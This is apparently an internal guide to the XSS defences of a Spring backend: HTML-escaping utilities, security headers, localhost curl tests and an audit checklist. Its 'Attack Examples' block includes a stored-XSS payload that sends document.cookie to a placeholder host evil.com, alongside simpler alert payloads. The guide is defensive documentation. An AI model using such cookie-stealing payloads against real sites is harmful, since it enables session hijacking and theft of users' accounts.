# XSS Protection Implementation Guide

## Overview
This document describes the XSS (Cross-Site Scripting) protections implemented in the backend application.

## What Was Vulnerable

### Before Implementation:
1. **No Input Sanitization** - User inputs were stored directly in the database without HTML escaping
2. **Stored XSS Risk** - Malicious scripts in test titles, descriptions, user names could be executed
3. **Reflected XSS in Error Messages** - Exception messages were returned without escaping
4. **No Content Security Policy** - Browser had no restrictions on script execution

### Attack Examples:
```javascript
// Malicious test title
<script>alert('XSS')</script>

// Malicious user name
<img src=x onerror=alert('XSS')>

// JSON injection in description
{"malicious": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"}
```

## XSS Protection Layers

### 1. Input Sanitization (`XssUtils.java`)
A utility class that provides HTML escaping for all user inputs:

```java
// Escapes: < > & " ' to HTML entities
String safe = XssUtils.sanitize(userInput);

// With length limit to prevent DoS
String safe = XssUtils.sanitizeWithLimit(userInput, 200);

// Removes all HTML tags (most aggressive)
String safe = XssUtils.stripHtml(userInput);
```

**How it works:**
- `<script>` becomes `&lt;script&gt;`
- `<img src=x onerror=alert(1)>` becomes `&lt;img src=x onerror=alert(1)&gt;`
- These render as text, not executable code

### 2. Service Layer Protection
All user inputs are sanitized at the service layer:

#### TestService
- Test titles (max 200 chars)
- Test descriptions (max 1000 chars)
- Topics (max 100 chars)
- Emojis (max 10 chars)
- Questions JSON

#### UserService
- User names (max 100 chars) during profile updates

#### AuthService
- User names during registration

### 3. Error Message Sanitization
All exception messages in `GlobalExceptionHandler` are sanitized before being returned to prevent reflected XSS through error messages.

### 4. Security Headers (`SecurityHeadersConfig.java`)
Additional HTTP headers provide defense-in-depth:

| Header | Value | Purpose |
|--------|-------|---------|
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing |
| `X-XSS-Protection` | `1; mode=block` | Enables browser XSS filter |
| `Content-Security-Policy` | (see config) | Restricts script sources |
| `X-Frame-Options` | `SAMEORIGIN` | Prevents clickjacking |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Controls referrer info |

### 5. Content-Type Enforcement
All REST endpoints return `application/json` with proper Content-Type headers, making XSS harder to exploit.

## Testing XSS Protection

### Test 1: Stored XSS in Test Title
```bash
curl -X POST http://localhost:9090/api/tests \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<script>alert(\"XSS\")</script>",
    "description": "Test description"
  }'
```

**Expected:** Title is stored as `&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;`

### Test 2: XSS in User Name
```bash
curl -X POST http://localhost:9090/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "test@test.com",
    "name": "<img src=x onerror=alert(1)>",
    "password": "password123"
  }'
```

**Expected:** Name is stored as `&lt;img src=x onerror=alert(1)&gt;`

### Test 3: XSS in Error Message
Try to trigger an error with malicious input and verify the error message is sanitized.

## What's Protected

✅ **Stored XSS** - Malicious scripts in database fields are escaped
✅ **Reflected XSS** - Error messages and dynamic content are sanitized
✅ **DOM-based XSS** - CSP headers restrict inline scripts
✅ **JSON Injection** - All JSON strings are properly escaped

## What's NOT Protected (Frontend Responsibility)

⚠️ **Client-side rendering** - Frontend must also sanitize when displaying HTML
⚠️ **JavaScript eval()** - Frontend should never use eval() with user input
⚠️ **innerHTML** - Frontend should use textContent instead of innerHTML

## Best Practices for Developers

### When Adding New Endpoints:
1. **Always sanitize user inputs** in the service layer
   ```java
   request.setTitle(XssUtils.sanitizeWithLimit(request.getTitle(), 200));
   ```

2. **Use appropriate limits** to prevent DoS attacks
   ```java
   XssUtils.sanitizeWithLimit(input, maxLength);
   ```

3. **Return JSON, not HTML** from REST endpoints

4. **Never trust user input** - sanitize everything

### When Displaying Data (Frontend):
1. Use React's default escaping (don't use dangerouslySetInnerHTML)
2. Use DOMPurify for rich text content
3. Validate data types on the client side too

## Security Audit Checklist

- [x] Input sanitization on all user-controllable fields
- [x] Output encoding in error messages
- [x] Security headers configured
- [x] Content-Type enforcement
- [x] No direct HTML rendering from API
- [ ] Frontend XSS protection (separate concern)
- [ ] Regular security testing with OWASP ZAP
- [ ] Penetration testing

## Additional Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Spring Security Documentation](https://docs.spring.io/spring-security/reference/index.html)
- [Content Security Policy Guide](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)

## Monitoring & Logging

Consider adding:
1. **Logging of suspicious inputs** - Log when XSS patterns are detected
2. **Rate limiting** - Prevent automated XSS injection attempts
3. **WAF (Web Application Firewall)** - Additional layer for production

## Updates and Maintenance

- Review OWASP Top 10 annually
- Update XssUtils as new attack vectors emerge
- Test with latest browser versions
- Monitor CVEs for Spring dependencies
